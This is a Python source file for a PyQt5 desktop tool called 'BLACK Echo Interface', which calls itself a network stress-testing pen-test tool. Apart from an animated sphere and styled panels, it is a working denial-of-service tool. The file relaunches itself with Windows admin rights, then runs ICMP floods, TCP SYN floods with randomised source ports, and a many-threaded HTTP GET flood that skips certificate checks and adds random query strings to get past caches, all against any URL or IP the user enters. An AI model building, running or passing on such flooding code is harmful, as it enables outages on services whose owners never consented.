import sys
import ctypes

# Check for admin rights on Windows; restart as admin if not
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, __file__, None, 1
    )
    sys.exit()

# Your existing imports
import math
import threading
import asyncio
import ssl
import random
from PyQt5.QtCore import Qt, QTimer, QPointF, QSize
from PyQt5.QtGui import QColor, QPainter, QPen, QBrush
from PyQt5.QtWidgets import (
    QApplication, QWidget, QLabel, QLineEdit, QPushButton,
    QHBoxLayout, QVBoxLayout, QGridLayout, QComboBox, QSlider,
    QTextEdit, QFrame
)

# =================== COLORS / FONTS ===================
BG_BLACK = QColor(3, 6, 12)
SPECTRAL_ICE = QColor(127, 203, 255)
SPECTRAL_ICE_SOFT = QColor(127, 203, 255, 140)
FONT_FAMILY = "JetBrains Mono"

# ==== Optional Libraries ====
try:
    from scapy.all import IP, ICMP, TCP, send, conf
    conf.verb = 0
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import aiohttp
    import aiohttp.connector
    AIOHTTP_AVAILABLE = True
except ImportError:
    AIOHTTP_AVAILABLE = False

# ==== Custom Widgets ====
class HoloSphereWidget(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.angle = 0
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.update_angle)
        self.timer.start(30)

    def update_angle(self):
        self.angle = (self.angle + 1.5) % 360
        self.update()

    def sizeHint(self):
        return QSize(420, 420)

    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.Antialiasing, True)
        w = self.width()
        h = self.height()
        size = min(w, h) * 0.9
        cx = w / 2
        cy = h / 2

        # Background glow
        grad_radius = size * 0.7
        painter.setBrush(QBrush(QColor(10, 30, 60, 180)))
        painter.setPen(Qt.NoPen)
        painter.drawEllipse(QPointF(cx, cy), grad_radius, grad_radius)

        # Sphere core
        sphere_radius = size * 0.32
        painter.setBrush(QBrush(QColor(15, 40, 80)))
        painter.setPen(QPen(QColor(127, 203, 255, 80), 2))
        painter.drawEllipse(QPointF(cx, cy), sphere_radius, sphere_radius)

        # Inner glow
        painter.setBrush(QBrush(QColor(80, 180, 255, 80)))
        painter.setPen(Qt.NoPen)
        painter.drawEllipse(QPointF(cx, cy), sphere_radius * 0.7, sphere_radius * 0.7)

        # Rotating ring
        ring_radius = sphere_radius * 1.25
        painter.save()
        painter.translate(cx, cy)
        painter.rotate(self.angle)
        painter.setPen(QPen(QColor(127, 203, 255), 3))
        painter.drawArc(
            int(-ring_radius),
            int(-ring_radius),
            int(2 * ring_radius),
            int(2 * ring_radius),
            30 * 16,
            300 * 16
        )
        painter.restore()

        # Signal waves
        for i, factor in enumerate([1.6, 2.0, 2.4]):
            r = sphere_radius * factor
            alpha = 80 - i * 20
            painter.setPen(QPen(QColor(127, 203, 255, alpha), 1.2))
            painter.drawEllipse(QPointF(cx, cy), r, r)

        # Waveform line
        line_y = cy + sphere_radius * 1.9
        start_x = cx - size * 0.45
        end_x = cx + size * 0.45
        painter.setPen(QPen(QColor(80, 160, 230, 180), 2))
        painter.drawLine(int(start_x), int(line_y), int(end_x), int(line_y))

        # Waveform bumps
        segments = 40
        width = end_x - start_x
        painter.setPen(QPen(QColor(127, 203, 255, 80), 1.5))
        for i in range(segments):
            x = start_x + width * (i / segments)
            phase = (self.angle / 20.0) + i * 0.3
            amp = 5
            y = line_y - math.sin(phase) * amp
            painter.drawLine(int(x), int(line_y), int(x), int(y))

class GlassPanel(QFrame):
    def __init__(self, title=None, parent=None):
        super().__init__(parent)
        self.setObjectName("GlassPanel")
        self.setStyleSheet("""
            QFrame#GlassPanel {
                background-color: rgba(8, 12, 20, 200);
                border: 1px solid rgba(127, 203, 255, 90);
                border-radius: 8px;
            }
        """)
        self.layout = QVBoxLayout(self)
        self.layout.setContentsMargins(12, 10, 12, 12)
        self.layout.setSpacing(8)
        if title:
            lbl = QLabel(title)
            lbl.setObjectName("PanelTitle")
            self.layout.addWidget(lbl)

# =================== Main GUI ===================
class BlackEchoInterface(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("BLACK Echo Interface - A pen testing tool for network stress testing")
        self.resize(1280, 720)
        self.setFocusPolicy(Qt.StrongFocus)
        self.attack_threads = []
        self.stop_event = threading.Event()
        self.total_bytes_sent = 0
        self.init_ui()

        # Timer to update data output display
        self.data_timer = QTimer()
        self.data_timer.timeout.connect(self.update_data_display)
        self.data_timer.start(1000)

    def toggle_fullscreen(self):
        if self.isFullScreen():
            self.showNormal()
        else:
            self.showFullScreen()

    def keyPressEvent(self, event):
        if event.key() == Qt.Key_F11:
            self.toggle_fullscreen()
        super().keyPressEvent(event)

    def init_ui(self):
        # Main layout
        layout = QHBoxLayout(self)
        layout.setContentsMargins(20, 20, 20, 20)
        layout.setSpacing(20)

        # Left: animated sphere
        self.holo = HoloSphereWidget()
        self.holo.setMinimumSize(420, 420)
        layout.addWidget(self.holo, 4)

        # Right: controls
        vbox = QVBoxLayout()
        vbox.setSpacing(12)

        # Target config
        target_frame = QFrame()
        target_frame.setObjectName("GlassPanel")
        grid = QGridLayout(target_frame)
        grid.addWidget(QLabel("Target URL:"), 0, 0)
        self.target_url = QLineEdit()
        grid.addWidget(self.target_url, 0, 1)
        btn_lock_url = QPushButton("LOCK")
        grid.addWidget(btn_lock_url, 0, 2)

        grid.addWidget(QLabel("Target IP:"), 1, 0)
        self.target_ip = QLineEdit()
        grid.addWidget(self.target_ip, 1, 1)
        btn_lock_ip = QPushButton("LOCK")
        grid.addWidget(btn_lock_ip, 1, 2)

        vbox.addWidget(target_frame)

        # Attack parameters
        attack_frame = QFrame()
        attack_frame.setObjectName("GlassPanel")
        attack_grid = QGridLayout(attack_frame)
        self.mode_combo = QComboBox()
        self.mode_combo.addItems(["Silent Pulse", "Vector Flood", "HTTP Flood"])
        attack_grid.addWidget(QLabel("Attack Mode:"), 0, 0)
        attack_grid.addWidget(self.mode_combo, 0, 1, 1, 2)

        self.threads_slider = QSlider(Qt.Horizontal)
        self.threads_slider.setMinimum(1)
        self.threads_slider.setMaximum(500)
        self.threads_slider.setValue(150)
        attack_grid.addWidget(QLabel("Threads:"), 1, 0)
        attack_grid.addWidget(self.threads_slider, 1, 1)
        self.threads_label = QLabel("150")
        attack_grid.addWidget(self.threads_label, 1, 2)

        self.status_label = QLabel("System ready.")
        attack_grid.addWidget(self.status_label, 2, 0, 1, 3)

        vbox.addWidget(attack_frame)

        # Output log
        self.output_log = QTextEdit()
        self.output_log.setReadOnly(True)
        self.output_log.setText("Awaiting command...\n")
        vbox.addWidget(QLabel("Output Log"))
        vbox.addWidget(self.output_log, 1)

        # Data output label
        self.data_label = QLabel("Data Output: 0 B")
        vbox.addWidget(self.data_label)

        # Control buttons
        btn_layout = QHBoxLayout()
        self.start_btn = QPushButton("START ATTACK")
        self.stop_btn = QPushButton("STOP ATTACK")
        self.start_btn.setObjectName("Start")
        self.stop_btn.setObjectName("Stop")
        self.start_btn.setStyleSheet("font-weight: bold; font-size: 14px; padding: 12px;")
        self.stop_btn.setStyleSheet("font-weight: bold; font-size: 14px; padding: 12px; color: red;")
        btn_layout.addWidget(self.start_btn)
        btn_layout.addWidget(self.stop_btn)
        vbox.addLayout(btn_layout)

        layout.addLayout(vbox, 6)

        # Connect buttons
        self.start_btn.clicked.connect(self.start_attack)
        self.stop_btn.clicked.connect(self.stop_attack)
        self.threads_slider.valueChanged.connect(lambda v: self.threads_label.setText(str(v)))

        # Initialize attack control
        self.attack_threads = []
        self.attack_stop_event = threading.Event()

    def update_data_display(self):
        size = self.total_bytes_sent
        for unit in ['B','KB','MB','GB','TB','PB']:
            if size < 1024:
                break
            size /= 1024
        self.data_label.setText(f"Data Output: {size:.2f} {unit}")

    def append_log(self, msg):
        self.output_log.append(msg)

    def start_attack(self):
        self.attack_stop_event.clear()
        self.attack_threads = []
        self.total_bytes_sent = 0
        target_url = self.target_url.text().strip()
        attack_mode = self.mode_combo.currentText()
        threads = self.threads_slider.value()

        if not target_url:
            self.append_log("Target URL is empty.")
            return

        self.append_log(f"Starting {attack_mode} attack on {target_url} with {threads} threads.")

        if attack_mode == "HTTP Flood" and AIOHTTP_AVAILABLE:
            def run():
                asyncio.run(http_flood(target_url, threads, self.attack_stop_event, self.append_log, self.add_bytes))
            t = threading.Thread(target=run, daemon=True)
            t.start()
            self.attack_threads.append(t)
        elif attack_mode == "Silent Pulse" and SCAPY_AVAILABLE:
            t = threading.Thread(target=icmp_flood, args=(target_url, self.attack_stop_event, self.append_log, self.add_bytes), daemon=True)
            t.start()
            self.attack_threads.append(t)
        elif attack_mode == "Vector Flood" and SCAPY_AVAILABLE:
            t = threading.Thread(target=tcp_syn_flood, args=(target_url, self.attack_stop_event, self.append_log, self.add_bytes), daemon=True)
            t.start()
            self.attack_threads.append(t)
        else:
            self.append_log("Selected attack mode not available or missing libraries.")

    def add_bytes(self, byte_count):
        self.total_bytes_sent += byte_count

    def stop_attack(self):
        self.append_log("Stopping attack...")
        self.attack_stop_event.set()
        for t in self.attack_threads:
            t.join()
        self.attack_threads.clear()
        self.append_log("Attack stopped.")

# Attack functions
def icmp_flood(target, stop_event, log_func, data_callback):
    if not SCAPY_AVAILABLE:
        log_func("scapy not available.")
        return
    from scapy.all import IP, ICMP, send
    size = 64
    while not stop_event.is_set():
        try:
            send(IP(dst=target)/ICMP(), verbose=0)
            data_callback(size)
        except:
            break

def tcp_syn_flood(target, stop_event, log_func, data_callback):
    if not SCAPY_AVAILABLE:
        log_func("scapy not available.")
        return
    from scapy.all import IP, TCP, send
    size = 60
    while not stop_event.is_set():
        try:
            send(IP(dst=target)/TCP(sport=random.randint(1024,65535), dport=random.choice([80,443,8080,22]), flags='S'), verbose=0)
            data_callback(size)
        except:
            break

async def http_flood(target, threads, stop_event, log_func, data_callback):
    if not AIOHTTP_AVAILABLE:
        log_func("aiohttp not available.")
        return
    import aiohttp
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(limit=threads, ssl=ctx)
    timeout = aiohttp.ClientTimeout(total=5)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        while not stop_event.is_set():
            try:
                path = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=10))
                url = f"{target}?{path}"
                async with session.get(url):
                    size = len(url.encode('utf-8'))
                    data_callback(size)
            except:
                pass

def main():
    app = QApplication(sys.argv)
    window = BlackEchoInterface()
    window.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()
